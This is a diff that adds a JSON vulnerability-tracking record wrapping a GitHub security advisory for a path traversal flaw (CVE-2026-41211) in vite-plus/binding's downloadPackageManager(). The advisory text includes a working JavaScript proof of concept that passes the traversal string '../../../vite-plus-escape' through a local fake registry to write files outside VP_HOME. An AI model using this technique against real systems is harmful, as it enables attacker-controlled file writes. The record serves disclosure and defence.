@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/109031036?v=4\", \"events_url\": \"https://api.github.com/users/Jvr2022/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Jvr2022/followers\", \"following_url\": \"https://api.github.com/users/Jvr2022/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Jvr2022/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Jvr2022\", \"id\": 109031036, \"login\": \"Jvr2022\", \"node_id\": \"U_kgDOBn-ufA\", \"organizations_url\": \"https://api.github.com/users/Jvr2022/orgs\", \"received_events_url\": \"https://api.github.com/users/Jvr2022/received_events\", \"repos_url\": \"https://api.github.com/users/Jvr2022/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Jvr2022/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Jvr2022/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Jvr2022\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41211\", \"cvss\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 10.0, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H\"}, \"cvss_v4\": {\"score\": 8.4, \"vector_string\": \"CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H\"}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\n\\n`downloadPackageManager()` in `vite-plus/binding` accepts an untrusted `version` string and uses it directly in filesystem paths. A caller can supply `../` segments to escape the `VP_HOME/package_manager/<pm>/` cache root and cause Vite+ to delete, replace, and populate directories outside the intended cache location.\\n\\n### Details\\n\\nThe public `vite-plus/binding` export `downloadPackageManager()` forwards `options.version` directly into the Rust package-manager download flow without validating that it is a normal semver version.\\n\\nThat value is used as a path component when building the install location under `VP_HOME`. After the package is downloaded and extracted, Vite+:\\n\\n1. computes the final target directory from the raw `version` string,\\n2. removes any pre-existing directory at that target,\\n3. renames the extracted package into that location, and\\n4. writes executable shim files there.\\n\\nBecause the CLI validates versions via `semver::Version::parse()` before calling this code, the protection that exists for normal `vp create`, `vp migrate`, and `vp env` flows does not apply to direct callers of the binding. A programmatic caller of `vite-plus/binding` can pass traversal strings such as `../../../escaped` and break out of `VP_HOME`.\\n\\n### PoC\\n\\n```js\\nimport fs from \\\"node:fs\\\";\\nimport http from \\\"node:http\\\";\\nimport os from \\\"node:os\\\";\\nimport path from \\\"node:path\\\";\\nimport { downloadPackageManager } from \\\"vite-plus/binding\\\";\\n\\nconst tgz = Buffer.from(\\n  \\\"H4sIAH/B1GkC/+3NsQqDMBjE8W/uU4hTXUwU0/dJg0irTYLR9zftUnCWQvH/W+645aJ1ox16dX94FX181e6Z5GA6u3XdJ7N9at223/7em8YYI4WWH1jTYud8L+fkgk9h6uspDNcyjGV1EQAAAAAAAAAAAAAAAADAH9gAb+vJ9QAoAAA=\\\",\\n  \\\"base64\\\",\\n);\\n\\nconst vpHome = fs.mkdtempSync(path.join(os.tmpdir(), \\\"vp-home-\\\"));\\nconst version = \\\"../../../vite-plus-escape\\\";\\nconst escapedRoot = path.resolve(vpHome, \\\"package_manager\\\", \\\"pnpm\\\", version);\\nconst escapedInstallDir = path.join(escapedRoot, \\\"pnpm\\\");\\n\\nprocess.env.VP_HOME = vpHome;\\n\\nconst server = http.createServer((req, res) => {\\n  res.writeHead(200, { \\\"content-type\\\": \\\"application/octet-stream\\\" });\\n  res.end(tgz);\\n});\\n\\nawait new Promise((resolve) => server.listen(0, \\\"127.0.0.1\\\", resolve));\\nconst { port } = server.address();\\nprocess.env.npm_config_registry = `http://127.0.0.1:${port}`;\\n\\nconst result = await downloadPackageManager({\\n  name: \\\"pnpm\\\",\\n  version,\\n});\\n\\nserver.close();\\n\\nconsole.log(\\\"VP_HOME =\\\", vpHome);\\nconsole.log(\\\"installDir =\\\", result.installDir);\\nconsole.log(\\\"escaped =\\\", escapedInstallDir);\\nconsole.log(\\\"shim exists =\\\", fs.existsSync(path.join(escapedInstallDir, \\\"bin\\\", \\\"pnpm\\\")));\\n\\n// installDir is outside VP_HOME, and <escaped>/pnpm/bin/pnpm is created\\n```\\n\\n### Impact\\n\\nA caller that can influence `downloadPackageManager()` input can escape the Vite+ cache directory and make the process overwrite attacker-chosen directories outside `VP_HOME`. When combined with the supported custom-registry override (`npm_config_registry`), this becomes attacker-controlled file write outside the intended install root.\\n\\n### Mitigating factors\\n\\n- **Normal CLI usage is not affected.** All built-in CLI paths (`vp create`, `vp migrate`, `vp env`) validate the version string via `semver::Version::parse()` before it reaches `downloadPackageManager()`.\\n- The vulnerability is only reachable by programmatic callers that import `vite-plus/binding` directly and pass an untrusted version string.\\n- No known downstream consumers pass untrusted input to this function.\\n- Exploitation requires the attacker to already be executing code in the same Node.js process.\", \"epss\": {\"percentage\": 0.00311, \"percentile\": 0.22644}, \"ghsa_id\": \"GHSA-33r3-4whc-44c2\", \"github_reviewed_at\": \"2026-04-16T01:02:48Z\", \"html_url\": \"https://github.com/advisories/GHSA-33r3-4whc-44c2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-33r3-4whc-44c2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41211\"}], \"nvd_published_at\": \"2026-04-23T02:16:18Z\", \"published_at\": \"2026-04-16T01:02:48Z\", \"references\": [\"https://github.com/voidzero-dev/vite-plus/security/advisories/GHSA-33r3-4whc-44c2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41211\", \"https://github.com/advisories/GHSA-33r3-4whc-44c2\"], \"repository_advisory_url\": \"https://api.github.com/repos/voidzero-dev/vite-plus/security-advisories/GHSA-33r3-4whc-44c2\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/voidzero-dev/vite-plus\", \"summary\": \" Path traversal in vite-plus/binding downloadPackageManager() writes outside VP_HOME\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-06T13:57:46Z\", \"url\": \"https://api.github.com/advisories/GHSA-33r3-4whc-44c2\", \"vulnerabilities\": [{\"first_patched_version\": \"0.1.17\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vite-plus\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.1.16\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-33r3-4whc-44c2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vite-plus: <= 0.1.16"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-41211"
+    ],
+    "cvss_score": 10.0,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vite-plus"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:03.846619Z",
+  "provenance": {
+    "content_sha256": "3ed97330aca997dccae30af0f84b51f16cd711d1ea33146cd22faac3b6047af3",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-16T01:02:48Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-33r3-4whc-44c2",
+  "status": "active",
+  "title": " Path traversal in vite-plus/binding downloadPackageManager() writes outside VP_HOME",
+  "updated_at": "2026-05-06T13:57:46Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-33r3-4whc-44c2"
+}
